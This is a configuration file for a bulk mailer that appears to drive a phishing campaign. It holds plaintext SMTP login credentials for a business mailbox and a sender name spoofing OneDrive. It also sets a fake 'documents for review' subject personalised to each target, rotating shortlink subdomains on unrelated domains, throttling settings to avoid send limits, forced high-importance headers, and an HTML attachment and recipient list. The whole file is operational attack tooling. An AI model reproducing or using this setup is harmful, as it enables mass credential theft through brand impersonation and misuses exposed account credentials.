// multi smtp only duplicate as many objects as possible
exports.smtp = [
	{
		host	: "mail.empoweredconsumerism.com",
		port	: "587",
		auth	: true, 
		user 	: "cares@empoweredconsumerism.com",
		pass	: "ec5.cares"
    }
	
];

// Message Info
exports.message = [
	{
		fromName	: "{randomname}Onedrive",
		replyTo	: "cares@empoweredconsumerism.com",
		subject		: "FBMSA Documents- {random_number_5}-FMBS- Review for {email}",
		fromEmail	: "cares@empoweredconsumerism.com", // For  Multy mail from use ["example1@mail.com","example2@email.com","example3@email.com" ]
	}

	
];

// Multy shortlink
exports.shortlink = [
	'https://{random_number_5}.homesolarpk.com',
	'https://{random_number_5}.bmi123.ir',
	
]

exports.send = {
	delay			: 3, // Seconds per send
	pauseAfter		: 100, // Pause after how many emails
	pauseFor		: 5, // Pause for how many seconds
	useHeader		: true, // if true it will use High importance.
	useAttach		: false, // if true it will use the attachment that is set in the attachment
	useHttpProxy	: false, // if true then send will use the http proxy that has been set
	text			: "This is test from CRANE101, Use html letter.", // this is the text version of the html letter, it will be displayed if the html cannot be displayed
	letter 			: "letter.html", // HTML Message
	list 			: "emails.txt"  // Emails File Name
};

exports.proxy = {
	http 	: "" // Proxy
};

exports.attach = {
file 	: "Xeros0201.html" // Attach File can be pdf or anything
};

exports.custom_headers = {
    "x-priority": "1",
    "x-msmail-priority": "High",
    importance: "high"
};